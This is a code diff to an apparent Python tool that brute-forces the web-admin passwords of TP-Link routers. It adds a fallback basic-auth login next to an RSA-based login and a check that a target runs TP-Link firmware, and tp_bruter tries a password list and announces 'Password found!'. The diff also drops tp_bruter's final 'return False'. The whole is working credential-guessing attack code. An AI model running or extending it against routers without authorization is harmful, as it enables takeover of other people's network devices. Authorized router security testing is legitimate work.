@@ -3,10 +3,19 @@ import re
 import typing
 import hashlib
 import base64
-import sys
-from colors import colors
 import tp_link_crypto
 
+colors = {
+    'Color_Off': "\033[0m",
+    'Black': "\033[0;30m",
+    'Red': "\033[0;31m",
+    'Green': "\033[0;32m",
+    'Yellow': "\033[0;33m",
+    'Blue': "\033[0;34m",
+    'Purple': "\033[0;35m",
+    'Cyan': "\033[0;36m",
+    'White': "\033[0;37m"
+}
 
 DEBUG: bool = False
 VERBOSE: bool = False
@@ -84,7 +93,40 @@ def authenticate(s: requests.Session, ip_addr: str, password: str) -> bool:
     rsa_vals = get_rsa_public_key(s, ip_addr)
     if rsa_vals is None:
         print(f"{colors['Red']}[-] {colors['Yellow']}Failed to get RSA public key and sequence values{colors['Color_Off']}")
+        return authenticate_2(s, ip_addr, password)
+    return authenticate_rsa(password, rsa_vals, ip_addr, s)
+def authenticate_2(s: requests.Session, ip_addr: str, password: str) -> bool:
+    """
+    Authenticates with the TP-Link router using the older method.
+    :param s: The active requests session
+    :param ip_addr: The router's IP address
+    :param password: The password to the router's web server
+    :return: True on success, otherwise False
+    """
+    login_data = {
+        "username": USERNAME,
+        "password": password
+    }
+    headers = {
+        "Connection": "keep-alive",
+        "Referer": f"http://{ip_addr}/",
+        "Accept-Encoding": "gzip, deflate",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Cookie": f"Authorization=Basic {base64.b64encode(f'{USERNAME}:{password}'.encode()).decode()}",
+    }
+    try:
+        resp = s.get(f"http://{ip_addr}/", headers=headers)
+    except:
+        print(f"{colors['Red']}[-] {colors['Yellow']}Login endpoint error.{colors['Color_Off']}")
         return False
+
+    if "The username or password is incorrect" in resp.text:
+        print(f"{colors['Red']}[-] {colors['Yellow']}Login failed, invalid credentials.{colors['Color_Off']}")
+        return False
+
+    print_v(f"{colors['Green']}[+] {colors['Yellow']}Login successful{colors['Color_Off']}")
+    return True
+def authenticate_rsa(password: str, rsa_vals: typing.Tuple[int, int, int], ip_addr: str, s: requests.Session) -> bool:
     e, n, seq = rsa_vals
 
     # Create the data field
@@ -179,11 +221,10 @@ def tp_bruter(ip_addr: str, passList: list) -> int:
             print(f"{colors['Green']}[+] Password found! '{colors['Purple']}{password}{colors['Color_Off']}'")
             return password
     s.close()
-    return False
-def is_tplink(ip_addr: str) -> bool:
+def is_tplink(ip_port: str) -> bool:
     try:
         s = requests.Session()
-        resp = s.get(f"http://{ip_addr}/", timeout=5)
+        resp = s.get(f"http://{ip_port}/", timeout=5)
         s.close()
         if "TP-LINK" in resp.text:
             return True
